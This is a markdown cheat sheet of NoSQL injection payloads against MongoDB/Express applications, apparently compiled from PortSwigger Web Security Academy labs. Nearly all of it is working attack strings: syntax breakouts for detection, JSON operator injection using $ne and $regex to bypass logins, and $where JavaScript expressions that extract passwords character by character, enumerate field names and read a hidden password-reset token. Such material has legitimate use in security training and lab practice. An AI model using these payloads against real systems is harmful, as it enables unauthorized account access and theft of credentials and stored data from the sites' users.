# 🍃 NoSQL Injection Cheatsheet

Complete methodology, bypass techniques, and exploitation vectors for NoSQL Injection (MongoDB/Express) labs tested in PortSwigger Web Security Academy.

---

## 📌 Attack Vectors & Methodology

* Target Formats: JSON POST Bodies, URL Parameters
* Primary MongoDB Operators: `$ne`, `$regex`, `$gt`, `$where`
* Syntax Breakouts: `'||'1'=='1`, `'&&this.password.length>0//`

---

## 🛠️ Detailed Breakdown & Payloads

* **Detecting NoSQL injection:**
  - Break out of MongoDB JavaScript syntax queries by injecting string delimiters and logical operators:
  - `category=Gifts'%'22`
  - `category=Gifts'||'1'=='1`
  - `category=Gifts'%26%26'1'=='1`

* **Exploiting NoSQL operator injection to bypass authentication:**
  - Replace raw string fields with MongoDB query objects using `$ne` (not equal) or `$regex` in JSON payloads:
  - JSON Auth Bypass:
    `{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}`
  - Regex Auth Bypass:
    `{"username": "admin", "password": {"$regex": ".*"}}`

* **Exploiting NoSQL injection to extract data:**
  - Use JavaScript expression injection (`$where` context) to brute-force field values or passwords character-by-character:
  - Length Testing:
    `username=administrator' && this.password.length == 8 || 'a'=='b`
  - Character Extraction:
    `username=administrator' && this.password[0] == 'a' || 'a'=='b`
    `username=administrator' && this.password.match(/^a.*/) || 'a'=='b`

* **Exploiting NoSQL operator injection to extract unknown fields:**
  - Inject query operators in JSON to enumerate unknown schema fields by testing field existence with `$where` or `$regex`:
  - Enumerate Field Names via JSON:
    `{"username": "administrator", "password": {"$ne": "1"}, "$where": "Object.keys(this)[0].length == 4"}`
  - Test Hidden Field Values:
    `{"username": "administrator", "$where": "this.forgetPasswordToken.match(/^a.*/)"}`

---
